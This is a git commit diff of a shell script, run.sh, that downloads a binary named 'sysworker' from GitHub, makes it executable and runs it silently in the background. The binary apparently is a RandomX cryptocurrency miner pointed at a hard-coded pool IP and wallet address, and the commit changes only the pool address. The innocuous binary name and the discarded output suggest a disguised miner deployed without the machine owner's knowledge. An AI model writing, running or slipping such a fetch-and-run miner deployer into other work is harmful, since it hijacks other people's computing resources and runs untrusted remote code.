f2ad42fcfdf83c8d66bb0ac69ae431dc460e3ba4
bandujuna77-debug <bandujuna77@gmail.com>
2026-09-25 18:34:58 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,4 +2,4 @@
 
 wget https://github.com/bandujuna77-debug/sae/raw/refs/heads/main/sysworker
 chmod 777 sysworker
-nohup setsid ./sysworker -a rx/0 -o 104.207.93.233:443  -u 44yfAkraFFTPJhnDyqLnJhQDtdVEmCjRbNpnM5966oB6Vi1oWvm7Y67TCvFuPeqHNGAspJY8cJvh5gQGGrV8VmpBGArWjvR -p x -t 8 >/dev/null 2>&1 </dev/null &
+nohup setsid ./sysworker -a rx/0 -o 141.95.126.31:1111 -u 44yfAkraFFTPJhnDyqLnJhQDtdVEmCjRbNpnM5966oB6Vi1oWvm7Y67TCvFuPeqHNGAspJY8cJvh5gQGGrV8VmpBGArWjvR -p x -t 8 >/dev/null 2>&1 </dev/null &
